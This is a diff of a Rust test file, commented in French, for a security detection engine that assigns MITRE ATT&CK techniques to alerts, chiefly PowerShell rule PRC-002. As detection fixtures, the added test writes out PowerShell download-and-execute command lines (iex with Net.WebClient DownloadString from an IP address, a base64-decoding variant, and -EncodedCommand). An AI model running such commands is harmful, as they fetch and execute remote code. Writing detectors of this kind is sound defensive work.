@@ -8523,7 +8523,7 @@ fn attack_lot2_table_des_techniques_complete() {
         }
     }
     par_l_alerte.sort();
-    assert_eq!(par_l_alerte, ["CHA-001", "COR-R7", "EXP-DPI-001", "EXP-IDS-001", "EXP-NDR-001", "PER-001", "PER-002", "PRC-003", "VIE-001", "VIE-002"]);
+    assert_eq!(par_l_alerte, ["CHA-001", "COR-R7", "EXP-DPI-001", "EXP-IDS-001", "EXP-NDR-001", "PER-001", "PER-002", "PRC-002", "PRC-003", "VIE-001", "VIE-002"]);
     // Toute technique posée par le code (identifiants littéraux) a un nom
     for (nom, source) in [("dpi", include_str!("dpi.rs")), ("ndr", include_str!("ndr.rs")), ("siem", include_str!("siem.rs")),
                           ("processus", include_str!("processus.rs")), ("persistance", include_str!("persistance.rs")),
@@ -8550,7 +8550,7 @@ fn attack_lot2_technique_par_regle_et_non_par_mots() {
     crate::mitre::enrichir(&mut b);
     assert_eq!(b.mitre, "T1486 Chiffrement de données (rançongiciel)");
     // Plusieurs techniques : libellés séparés par « / » ; règle posée par l'alerte : identifiants du code
-    let mut c = Alerte { regle: "PRC-002".into(), ..Default::default() };
+    let mut c = Alerte { regle: "PRC-002".into(), mitre: "T1059.001 / T1027".into(), ..Default::default() };
     crate::mitre::enrichir(&mut c);
     assert_eq!(c.mitre, "T1059.001 PowerShell / T1027 Code obscurci");
     let mut d = Alerte { regle: "EXP-NDR-001".into(), mitre: "T1557.002".into(), raisons: "usurpation ARP  [MITRE T1557.002]".into(), ..Default::default() };
@@ -8751,7 +8751,7 @@ fn attack_lot2_chaine_porte_les_techniques_de_ses_signaux() {
     let liste: std::collections::HashMap<u32, InfoListe> = [(100, ("explorer", 4)), (200, ("powershell", 100)), (300, ("cmd", 200))]
         .into_iter().map(|(pid, (nom, parent))| (pid, InfoListe { nom: nom.into(), parent })).collect();
     arbre.maj(&liste);
-    arbre.signaler_avec(200, 5, "PowerShell obscurci ou qui télécharge du code", &crate::mitre::identifiants_de_regle("PRC-002", ""));
+    arbre.signaler_avec(200, 5, "PowerShell obscurci ou qui télécharge du code", &crate::mitre::identifiants_de_regle("PRC-002", "T1059.001 / T1027"));
     arbre.signaler_avec(300, 7, "détournement d'outil Windows (LOLBin)", &["T1218".to_string()]);
     let mut a = arbre.alertes(&arbre.chaines());
     assert_eq!(a.len(), 1);
@@ -9684,6 +9684,39 @@ fn audit_p1_prc003_certutil_sans_t1047() {
     let mut c = crate::processus::alerte_processus(2, &deux).expect("PRC-003");
     crate::mitre::enrichir(&mut c);
     assert_eq!(crate::mitre::identifiants(&c), ["T1105", "T1047"]);
+}
+
+/// Revue externe du 2026-11-22, point mineur : PRC-002 sur un téléchargement seul ne porte plus T1027 Code obscurci ;
+/// l'obscurcissement la porte, une ligne qui a les deux porte les deux ; le code de comportement nomme les motifs vus
+#[test]
+fn revue_prc002_obscurci_seulement_si_vu() {
+    use crate::processus::{alerte_processus, codes_prc002, technique_prc002};
+    let ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
+    let tele = "powershell -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')";
+    let mut a = alerte_processus(1, &info_processus_test(ps, tele)).expect("PRC-002");
+    assert_eq!(a.regle, "PRC-002");
+    assert_eq!(a.comportement, "PRC-002:telecharge");
+    crate::mitre::enrichir(&mut a);
+    assert_eq!(crate::mitre::identifiants(&a), ["T1059.001"], "téléchargement seul ({})", a.mitre);
+    assert!(!a.mitre.contains("T1027"));
+    let enc = format!("powershell -NoProfile -EncodedCommand {}", "A".repeat(48));
+    let mut b = alerte_processus(2, &info_processus_test(ps, &enc)).expect("PRC-002 encodé");
+    assert_eq!(b.comportement, "PRC-002:obscurci");
+    crate::mitre::enrichir(&mut b);
+    assert_eq!(crate::mitre::identifiants(&b), ["T1059.001", "T1027"]);
+    let deux = "powershell iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('http://x/a'))))";
+    assert_eq!(technique_prc002(deux), "T1059.001 / T1027");
+    assert_eq!(codes_prc002(deux), ["obscurci", "telecharge"]);
+    for (ligne, t) in [("pwsh -c [Convert]::FromBase64String($x)", "T1059.001 / T1027"), ("powershell -c (New-Object Net.WebClient).DownloadFile('http://x/a','a')", "T1059.001"),
+                       ("powershell -w hidden -c iex $s", "T1059.001"), ("powershell -c Invoke-Expression $s", "T1059.001")] {
+        assert_eq!(technique_prc002(ligne), t, "{ligne}");
+    }
+    // Le motif de la règle reste la réunion des motifs : mêmes lignes vues qu'avant le découpage
+    for ligne in [tele, enc.as_str(), deux, "powershell -File a.ps1", "powershell -enc YQ==", "cmd /c downloadstring", "pwsh -windowstyle hidden -c start http://x"] {
+        let regle = crate::processus::suspicions_regles(ligne).iter().any(|(_, id)| *id == "PRC-002");
+        assert_eq!(regle, !codes_prc002(ligne).is_empty(), "{ligne}");
+    }
+    assert!(matches!(crate::regles::techniques("PRC-002"), Some(crate::regles::Techniques::ParLAlerte)));
 }
 
 /// PER-001 sur une clé Run : T1547.001, jamais T1546.003 ni les autres types de la règle
